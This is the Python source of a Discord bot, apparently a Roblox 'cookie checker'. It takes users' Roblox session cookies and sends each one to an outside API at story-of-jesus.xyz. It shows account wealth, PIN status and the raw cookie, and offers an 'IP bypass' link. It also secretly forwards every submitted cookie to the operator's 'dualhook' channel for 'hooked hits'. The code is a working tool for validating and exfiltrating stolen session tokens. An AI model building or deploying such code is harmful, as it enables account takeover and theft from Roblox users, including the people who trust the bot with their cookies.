import os
import keep_alive
import random, string
import discord, requests, json, re
from discord.ext import commands
from bs4 import BeautifulSoup

token = "Your bot Token"
yourprefix = "."  ## enter the prefix of your choice by replacing the !

dualhookchannelid = Yourchannleid ## Your channle id to get db hooked Hits, e.g 905536418934427096

bot = commands.Bot(command_prefix=yourprefix,
                   description="Cookie Checker Made by LucidHacker#6393")

@bot.command()
async def cc(
    ctx,
    cookie=None
):  ## By default make Cookie = To None, so that u can detect wether or not user has entered a cookie

    if cookie == None:
        await ctx.message.reply(
            "Oh No! It Seems You Have Not Provided A Cookie, Please Run The Command Again Using The Following Syntax '.cc mycookie'"
        )  ## let the user know they aint provided cookie
        return  ## break command

    r = requests.get(
        f'https://story-of-jesus.xyz/api/lucid.php?cookie={cookie}')
    ## Send get request to my api to get info about cookie in json
    data = r.json()  ## get json from request ^^

    if data["status"] == "failed":  ## if cookie is invalid api will respond with status: failed we will check for this value and if so let user know
        await ctx.message.reply(
            "***❌BRUH❌!! Your Really giving me an Expired/Invalid Cookie.***")
        return  ## break command

    ## grab values from json api :) if cookie is valid

    avatarurl = data["avatarurl"]
    userid = data["userid"]
    emailverified = data["emailverified"]
    username = data["username"]
    description = data["description"]
    displayname = data["displayname"]
    datecreated = data["datecreated"]
    days_old = data["days-old"]
    robux = data["robux"]
    pendingrobux = data["pendingrobux"]
    credit = data["credit"]
    premium = data["premium"]
    friends = data["friends"]
    followers = data["followers"]
    following = data["following"]
    rap = data["rap"]
    gender = data["gender"]
    country = data["country"]
    pin = data["pin"]
    groupsowned = data["groupsowned"]
    grouptotalrobux = data["grouptotalrobux"]
    if description == "":
        description = "Empty"  ## check if description is empty and if so set the variable to "Empty" because otherwise it bugs embed

    ## create embed with above data
    cook = discord.Embed(
        title=f'***Made by anonymous103#0001 / LucidHacker#6393***',
        color=0xdb2323)
    cook.set_thumbnail(url=f'{avatarurl}')
    cook.add_field(
        name="Recheck cookies",
        value=
        f'**[Click Here To Recheck The Cookie](https://story-of-jesus.xyz/checker/lucid-beams.php?cookie={cookie})**',
        inline=False)
    cook.add_field(name="UserID:🔍", value=f'```{userid}```', inline=True)
    cook.add_field(name="Display Name👀:",
                   value=f'```{displayname}```',
                   inline=True)
    cook.add_field(name="Description😵:",
                   value=f'```{description}```',
                   inline=True)
    cook.add_field(name="Gender♀️:", value=f'```{gender}```', inline=True)
    cook.add_field(name="Country🏴󠁧󠁢󠁥󠁮󠁧󠁿:󠁧󠁢󠁥󠁮󠁧󠁿",
                   value=f'```{country}```',
                   inline=True)
    cook.add_field(name="Verified Email🔐:",
                   value=f'```{emailverified}```',
                   inline=True)
    cook.add_field(name="Premium💎:", value=f'```{premium}```', inline=True)
    cook.add_field(name="Pin Enabled🔐:", value=f'```{pin}```', inline=True)
    cook.add_field(name="Robux💰:", value=f'```{robux}```', inline=True)
    cook.add_field(name="Pending-Robux⌛:",
                   value=f'```{pendingrobux}```',
                   inline=True)
    cook.add_field(name="Rap📈:", value=f'```{rap}```', inline=True)
    cook.add_field(name="Credit💰:", value=f'```{credit}```', inline=True)
    cook.add_field(name="Date Created🧒:",
                   value=f'```{days_old} Days Ago```',
                   inline=True)
    cook.add_field(name="Friends😎:", value=f'```{friends}```', inline=True)
    cook.add_field(name="Followers😎:", value=f'```{followers}```', inline=True)
    cook.add_field(name="Following😎:", value=f'```{following}```', inline=True)
    cook.add_field(name="Owned Groups 👑:", value=f'```{groupsowned}```', inline=True)
    cook.add_field(name="Group Robux💵:", value=f'```{grouptotalrobux}```', inline=True)
    cook.add_field(
        name="Profile Link:",
        value=
        f'**[Click Here](https://www.roblox.com/users/{userid}/profile)**',
        inline=False)
    cook.add_field(
        name='Rolimons: ',
        value=f'**[Click Here](https://rolimons.com/player/{userid})**',
        inline=False)
    cook.add_field(
        name='Ip bypass For your Cookie: ',
        value=f'**[Click Here](https://story-of-jesus.xyz/refresh/lucid-beams.php?cookie={cookie})**',
        inline=False)
    cook.set_footer(text='.invite to invite Cookie Checker Bott')

    cook.add_field(name='Cookie🍪:', value=f'```{cookie}```', inline=False)
    cook.add_field(
        name="Server Invite to suggest New Commands ",
        value=
        f'https://discord.gg/YTXAQ762B4',
        inline=False)
    await ctx.send(embed=cook)  ## send embed to the channel cmd was called in
    yourchannel = bot.get_channel(dualhookchannelid)
    await yourchannel.send(
        embed=cook)  ## send the embed to your channel u provided at start

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.do_not_disturb,
                              activity=discord.Activity(
                                  type=discord.ActivityType.playing,
                                  name="Cookie Checker"))
    print('LucidHacker#6393 on top')

    ## just startup event which sets bot activity to "Playing Cookie Checke 
  

keep_alive.keep_alive()
bot.run(token)
## make your bot run duh
